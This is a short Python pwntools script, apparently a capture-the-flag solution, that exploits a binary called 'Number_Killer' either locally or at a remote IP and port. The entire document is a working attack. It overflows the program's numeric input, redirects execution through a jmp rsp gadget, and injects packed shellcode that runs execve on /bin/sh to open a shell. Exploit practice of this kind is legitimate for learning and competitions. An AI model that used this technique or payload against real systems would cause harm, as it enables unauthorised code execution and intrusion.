#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./Number_Killer')
else:
    p = remote('47.103.214.163', 20001)
rop_jmp_rsp = 0x40078a

p.sendlineafter("Let's Pwn me with numbers!\n", '\x00')
for i in range(1, 12):
    p.sendline(str(0xcffffffff))
p.sendline(str(rop_jmp_rsp))
p.sendline(str(u64('\x48\x31\xc9\x48\xbb\x2f\x2f\x62')))
p.sendline(str(u64('\x69\x6e\x2f\x73\x68\x48\x89\x1f')))
p.sendline(str(u64('\x48\x31\xdb\xb8\x3b\x00\x00\x00')))
p.sendline(str(u64('\x0f\x05'.ljust(8, '\x00'))))
for i in range(17, 18):
    p.sendline(str(0))
# gdb.attach(p, "b *0x40078d\nc")
p.sendline(str(0))

p.interactive()
